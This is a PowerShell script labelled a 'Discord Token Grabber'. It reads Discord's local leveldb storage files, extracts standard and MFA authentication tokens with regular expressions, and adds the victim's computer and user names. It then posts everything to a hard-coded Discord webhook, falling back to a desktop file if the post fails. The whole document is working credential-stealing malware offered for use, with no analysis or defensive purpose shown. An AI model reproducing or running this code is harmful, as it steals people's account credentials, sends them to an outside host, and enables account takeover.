# Discord Token Grabber - Simple Working Version
$webhook = "https://discord.com/api/webhooks/1469805498189742195/saiTzv6t8ZlDu4OOXCBgMwJsl2Cqr6_hVjBkPp9qM2HFbBZ2g3hI_ERCf-oeVaUj1RxA"

# Check Discord paths
$paths = @(
    "$env:APPDATA\Discord\Local Storage\leveldb\",
    "$env:LOCALAPPDATA\Discord\Local Storage\leveldb\",
    "$env:APPDATA\DiscordCanary\Local Storage\leveldb\",
    "$env:APPDATA\DiscordPTB\Local Storage\leveldb\"
)

# Store found tokens
$allTokens = @()

foreach ($path in $paths) {
    if (Test-Path $path) {
        # Check .ldb files
        $ldbFiles = Get-ChildItem "$path*.ldb" -ErrorAction SilentlyContinue
        foreach ($file in $ldbFiles) {
            try {
                # Read file as binary
                $bytes = [System.IO.File]::ReadAllBytes($file.FullName)
                $text = [System.Text.Encoding]::Default.GetString($bytes)
                
                # Find standard tokens
                $standardTokens = [regex]::Matches($text, '[\w-]{24}\.[\w-]{6}\.[\w-]{27}')
                foreach ($match in $standardTokens) {
                    if ($match.Value -notin $allTokens) {
                        $allTokens += $match.Value
                    }
                }
                
                # Find MFA tokens
                $mfaTokens = [regex]::Matches($text, 'mfa\.[\w-]{84}')
                foreach ($match in $mfaTokens) {
                    if ($match.Value -notin $allTokens) {
                        $allTokens += $match.Value
                    }
                }
            } catch {
                # Skip files that can't be read
                continue
            }
        }
        
        # Check .log files too
        $logFiles = Get-ChildItem "$path*.log" -ErrorAction SilentlyContinue
        foreach ($file in $logFiles) {
            try {
                $bytes = [System.IO.File]::ReadAllBytes($file.FullName)
                $text = [System.Text.Encoding]::Default.GetString($bytes)
                
                $standardTokens = [regex]::Matches($text, '[\w-]{24}\.[\w-]{6}\.[\w-]{27}')
                foreach ($match in $standardTokens) {
                    if ($match.Value -notin $allTokens) {
                        $allTokens += $match.Value
                    }
                }
                
                $mfaTokens = [regex]::Matches($text, 'mfa\.[\w-]{84}')
                foreach ($match in $mfaTokens) {
                    if ($match.Value -notin $allTokens) {
                        $allTokens += $match.Value
                    }
                }
            } catch {
                continue
            }
        }
    }
}

# Send tokens if found
if ($allTokens.Count -gt 0) {
    # Simple text message
    $message = "# TOKEN FOUND`n`n"
    foreach ($token in $allTokens) {
        $message += "TOKEN: $token`n"
    }
    
    # Add system info
    $message += "Computer: $env:COMPUTERNAME`n"
    $message += "User: $env:USERNAME`n"
    $message += "Time: $(Get-Date)"
    
    # Send to Discord webhook
    $payload = @{
        content = $message
    } | ConvertTo-Json
    
    try {
        Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType 'application/json'
        Write-Host "Successfully sent tokens to webhook"
    } catch {
        Write-Host "Failed to send tokens: $_"
        
        # Save to file as backup
        $backupFile = "$env:USERPROFILE\Desktop\tokens_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
        $message | Out-File -FilePath $backupFile
        Write-Host "Tokens saved to: $backupFile"
    }
} else {
    Write-Host "No tokens found"
}